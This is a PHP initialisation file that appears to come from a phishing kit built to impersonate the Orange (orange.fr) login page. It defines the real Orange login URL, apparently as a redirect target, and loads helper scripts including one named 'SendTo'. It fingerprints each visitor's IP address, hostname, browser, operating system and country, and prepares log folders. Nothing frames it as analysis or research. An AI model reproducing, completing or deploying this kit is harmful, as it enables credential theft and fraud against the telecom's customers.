<?php
ob_start();
ini_set('display_errors', 1);
ini_set('display_startup_errors', 1);
error_reporting(E_ALL);
@set_time_limit(ini_get('0'));
header('Content-type: text/html; charset-UTF-8');
date_default_timezone_set('Europe/Paris');
session_start();
$current_date = date("y/m/d : H:i:s", time());



$directory = './include/';

(isset($fine) && $fine =="check") ? ($colect = "./orange/include/func/func.php") && ($SendTo = "./orange/include/to.php") && ($os = "./orange/include/os.php") : ($colect = $directory."func/func.php") && ($SendTo = $directory."to.php") && ($os = $directory."os.php");

define("IP_PUBLIC","http://ipecho.net/plain");
$favicon = 'view-source:https://cdn.woopic.com/c15d9d8fc98141b084d96f795046449b/auth-ssr-1.3.3//_next/static/icons/apple-touch-icon-57x57.png';
define("WEBSITE_OFFICIAL","https://login.orange.fr/?return_url=https%3A%2F%2Fwww.orange.fr%2Fportail");
$realIP = file_get_contents(IP_PUBLIC);
define("realIP",$realIP);
define("ROOT_FOLDER","orange");
define("PWESS","Elouafi");

$id    = "id=".mt_rand(1000000,99999999);
$user_agent = $_SERVER['HTTP_USER_AGENT'];
$go_index = "../index.php?";

(@require_once $colect) or die(" Your func Not Requierd");
(@require_once $os) or die(" Your func Not Requierd");
(@require_once $SendTo) or die(" Your func Not Requierd");
//$user ="86.205.18.12";
$user_agent = $_SERVER['HTTP_USER_AGENT'];
$navigateur = navigation($user_agent);
$opiration_system = system_opiration($user_agent);
$datet = date("H:i:s d/m/Y", time());
//$user ="79.91.65.3";
$ip = "91.88.106.79";
//$ip = get_client_ip();
$current_date = date("y/m/d : H:i:s", time());
$hostname = gethostbyaddr($ip);
$actual_link = extract_url();
$dream = grabinfos($ip);
$country = strtolower($dream['country']);
$Douc_R = "./orange/logs/";
$Douc_Rs = "./logs/";